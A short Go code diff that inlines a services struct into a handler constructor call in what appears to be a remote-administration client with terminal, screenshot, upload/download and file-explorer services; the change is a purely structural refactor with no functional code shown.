@@ -24,18 +24,18 @@ func NewApp(httpClient *http.Client, configuration *environment.Configuration) *
 	clientGateway := client.NewGateway(configuration, httpClient)
 
 	terminalService := terminal.NewTerminalService()
-	clientServices := &services.Services{
-		Information: information.NewInformationService(configuration.Server.Port),
-		Terminal:    terminalService,
-		Screenshot:  screenshot.NewScreenshotService(),
-		Download:    download.NewDownloadService(configuration, clientGateway),
-		Upload:      upload.NewUploadService(configuration, httpClient),
-		Explorer:    explorer.NewExplorerService(),
-		OS:          os.NewOperatingSystemService(configuration, terminalService),
-		URL:         url.NewURLService(terminalService),
-	}
+
 	return &App{
-		Handler: handler.NewHandler(configuration, clientGateway, clientServices),
+		Handler: handler.NewHandler(configuration, clientGateway, &services.Services{
+			Information: information.NewInformationService(configuration.Server.Port),
+			Terminal:    terminalService,
+			Screenshot:  screenshot.NewScreenshotService(),
+			Download:    download.NewDownloadService(configuration, clientGateway),
+			Upload:      upload.NewUploadService(configuration, httpClient),
+			Explorer:    explorer.NewExplorerService(),
+			OS:          os.NewOperatingSystemService(configuration, terminalService),
+			URL:         url.NewURLService(terminalService),
+		}),
 	}
 }
 
